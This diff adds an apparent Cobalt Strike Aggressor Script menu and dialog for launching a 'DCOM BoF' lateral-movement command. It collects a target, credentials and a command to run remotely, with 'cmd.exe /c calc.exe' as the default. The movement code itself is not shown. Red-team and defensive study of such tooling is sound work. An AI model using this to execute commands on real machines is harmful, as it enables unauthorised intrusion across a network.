@@ -1,0 +1,21 @@
+  item "DCOM Execution with BOF"{
+
+    local('$bid');
+        foreach $bid ($1){
+            OpenDcomDialog($bid);
+      }
+
+    }
+
+sub OpenDcomDialog{
+	$dialog = dialog("DCOM BoF", %(bid => $1, target => "",username => "", password => "", cmd => "c:\\\\windows\\\\system32\\\\cmd.exe", parameters => "/c calc.exe"), &callback);
+		dialog_description($dialog, "BOF to move laterally using DCOM. Leave Domain, username, and password empty if you want to use the current user");
+		drow_text($dialog, "target",  "Target:");
+		drow_text($dialog, "domain", "Domain:");
+		drow_text($dialog, "username", "Username:");
+		drow_text($dialog, "password", "Password:");
+		drow_text($dialog, "cmd", "Command:");
+		drow_text($dialog, "parameters", "Parameters:");
+		dbutton_action($dialog, "Launch");		
+		dialog_show($dialog);
+}
